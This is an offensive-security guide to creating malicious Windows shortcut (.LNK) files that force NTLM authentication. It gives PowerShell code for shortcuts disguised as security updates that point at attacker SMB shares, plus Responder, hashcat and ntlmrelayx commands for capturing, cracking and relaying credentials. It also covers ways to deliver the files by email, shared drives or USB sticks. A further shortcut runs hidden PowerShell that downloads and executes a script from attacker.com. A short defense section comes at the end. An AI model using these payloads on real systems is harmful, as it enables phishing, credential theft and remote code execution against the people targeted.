# LNK FILE ATTACKS - FORCED AUTHENTICATION

Create malicious .LNK (shortcut) files that trigger NTLM authentication when opened, capturing or relaying credentials. Extremely effective for credential theft in corporate environments.

## Overview

- **What it is**: Windows shortcut files (.lnk) that trigger forced authentication
- **Mechanism**: When opened, connects to attacker-controlled SMB share
- **Benefit**: User doesn't need to execute anything - just opening triggers auth
- **Stealth**: Appears as innocent shortcut (downloaded file, shared drive, email)
- **Payload**: Capture NTLMv2 hashes or relay credentials to other systems

## Creating Malicious LNK Files

### PowerShell Script to Create LNK

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\10.0.2.30\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

Key parameters:
- `TargetPath`: UNC path to attacker's SMB share (triggers auth)
- `IconLocation`: Legitimate-looking icon
- `Description`: Deceptive description to trick users
- `HotKey`: Optional keyboard shortcut

### Create "Innocent" Looking Shortcut

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Users\Public\Documents\Important_Update.lnk")
$lnk.TargetPath = "\\10.0.2.30\@update.exe"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll, 1"
$lnk.Description = "Please Run: Critical Security Update"
$lnk.Save()
```

## Setting Up Credential Capture

### Start Responder to Capture Hashes

```bash
sudo responder -I eth0 -dP
```

Flags:
- `-I`: Interface to listen on
- `-d`: Enable DHCP spoofing
- `-P`: Enable DNS/LLMNR spoofing
- `-v`: Verbose output

Output captures:
- NTLMv2 hashes
- NetNTLMv2 hashes
- SMBv2 authentication attempts

### Crack Captured Hashes

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

Mode 5600 = NTLMv2 (Net-NTLMv2)

## Relaying Credentials

### Setup SMB Relay Attack

Terminal 1 - Start Responder (doesn't relay, just captures):
```bash
sudo responder -I eth0 -dPv
```

Terminal 2 - Start ntlmrelayx to relay to target:
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

This relays captured credentials to target systems and executes commands.

### Using NetExec (Modern Alternative)

Create and distribute malicious LNK:

```bash
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 \
  -M slinky -o NAME=SecurityUpdate SERVER=10.0.2.30
```

This module:
- Creates a .lnk file with embedded UNC path
- Places it in common locations (Downloads, Desktop, etc.)
- Triggers auth when users open file

## Distribution Methods

### Method 1: Email Attachment
Send .lnk file directly:
- Appears as shortcut
- Users trust .lnk files more than executables
- Bypasses many email filters

### Method 2: Shared Drive
Place on network shares:
- File server
- Home directories  
- Common shares (Documents, Downloads)
- USB drive left at offices

### Method 3: Website Download
Host on attacker web server:
- Social engineering for clicks
- Combined with phishing campaign

## Practical Example - Full Attack Chain

```powershell
# 1. Create malicious LNK on attacker machine
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("Update.lnk")
$lnk.TargetPath = "\\attacker.com\share\update.exe"
$lnk.IconLocation = "%windir%\system32\shell32.dll, 13"
$lnk.Description = "Windows Update Required"
$lnk.Save()

# 2. Email to target or place on network share

# 3. On attacker's Kali/Linux machine:
# Terminal 1 - Capture hashes
sudo responder -I eth0 -dPv

# Terminal 2 - Relay to DC
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# 4. When user opens Update.lnk:
# - Credential capture in Responder
# - Maybe relay to DC = shell as that user
```

## Advanced: Command Execution LNK

Create .lnk that executes PowerShell:

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\System_Update.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")'"
$lnk.IconLocation = "%windir%\system32\imageres.dll, 14"
$lnk.Save()
```

When opened: Downloads and executes remote PowerShell script

## Defense & Detection

### Prevent LNK Attacks

- Disable automatic authentication to untrusted shares
- Block .lnk file execution from internet zone
- Use AppLocker/ASR rules for .lnk files
- Require explicit user action (vs automatic auth)
- Monitor SMB connections to unknown systems
- Disable LLMNR/NBT-NS at network level

### Detect LNK Attacks

Look for:
- Event ID 4625: Failed login attempts (multiple, rapid)
- Event ID 4768: Kerberos TGT requests from unusual accounts
- SMB connection logs to attacker IPs
- Responder's LLMNR/NBT-NS responses in network captures
- File access logs for .lnk files in public/shared directories
- Unusual UNC paths in .lnk file targets

### User Education

- Don't open shortcuts from untrusted sources
- Verify before opening attachments
- Be suspicious of "update" requests outside normal channels
- Report suspicious shortcuts immediately
- Check file properties before opening

## Resources & References

- **Forced Authentication Technique**: https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf